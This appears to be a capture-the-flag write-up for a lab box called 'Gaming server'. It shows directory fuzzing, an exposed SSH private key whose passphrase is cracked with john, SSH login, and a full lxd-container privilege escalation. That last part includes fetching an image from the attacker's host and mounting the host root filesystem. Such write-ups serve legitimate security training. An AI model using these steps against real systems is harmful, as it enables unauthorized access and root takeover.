# Gaming server

![image](https://user-images.githubusercontent.com/5285547/129213923-1713646e-a1c6-4cee-bc44-c178af9519f7.png)

Room link: 

## Enum

Nmap 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

# Port 80

The main site shows a cool game website. 

![image](https://user-images.githubusercontent.com/5285547/129214254-b87580b5-757e-4ef2-8246-6fcff584aa4e.png)

The source code shows an intresting entry too. 

![image](https://user-images.githubusercontent.com/5285547/129214467-d602a8ef-516a-44f7-a7ca-10985e03d1e1.png)

Looking about the website i stumble on an uploads section. Then a password list. 
I ran anthoer directory search and found a dir called secret 

```
ffuf -u http://10.10.1.66/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -fc 403 -ic

uploads                 [Status: 301, Size: 310, Words: 20, Lines: 10]
secret                  [Status: 301, Size: 309, Words: 20, Lines: 10]
```

Which led to a secret key! (id_rsa)

![image](https://user-images.githubusercontent.com/5285547/129217613-9f6b728f-18b7-4a17-822d-9641796e40be.png)

![image](https://user-images.githubusercontent.com/5285547/129214557-5d0b3f7a-cb10-4cf1-805c-82c70550ea9d.png)

![image](https://user-images.githubusercontent.com/5285547/129214980-5b939017-51a2-48bf-88dc-35f561b778a1.png)

After fuzzing and finding an intresting file, about.php. I checked the source code to see. 

![image](https://user-images.githubusercontent.com/5285547/129215745-66c5f4e4-8339-4b6b-a085-a2664553e6df.png)

---

## User

Using the key we found in secret we can try to login to the box on ssh. 

```
nano id_rsa
chmod 600 id_rsa
ssh john@10.10.1.66 -i id_rsa
```

But the id_rsa needed a password, So time to crack it! 

```
/usr/share/john/ssh2john.py id_rsa > hash 
john --wordlist=/usr/share/wordlists/rockyou.txt hash

letmein          (id_rsa)
```

Let's login again now.. 

```
ssh john@10.10.1.66 -i id_rsa
letmein
```

We are on the box. 

![image](https://user-images.githubusercontent.com/5285547/129218212-f063c3b7-8036-4fa8-8885-58542cd91ac2.png)

--- 

## Root

I copied linpeas to the box to see what we can find. I seen instanlty that lxd and sudo were vunerable. 

![image](https://user-images.githubusercontent.com/5285547/129218651-b3434233-d592-4aa0-bd91-ee74de7d924f.png)

### Lxc

Lxc showed no images on the box. 

![image](https://user-images.githubusercontent.com/5285547/129219144-399d5c08-291a-456a-aefe-c7ecc2442a9d.png)

So time to create one and get it on the box to be able to exploit it. 

```
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# copy the image to the machine.
sudo python3 -m http.server 8000
wget http://10.8.153.120:8000/alpine-v3.8-i686-20210812_1556.tar.gz

# import the image
lxc image import ./alpine*.tar.gz --alias myimage 
# It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default (accpet all defaults)
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

And we can get the last flag and finish the box. 

![image](https://user-images.githubusercontent.com/5285547/129220300-54481fba-27e0-4d0a-b42f-79da576289d0.png)

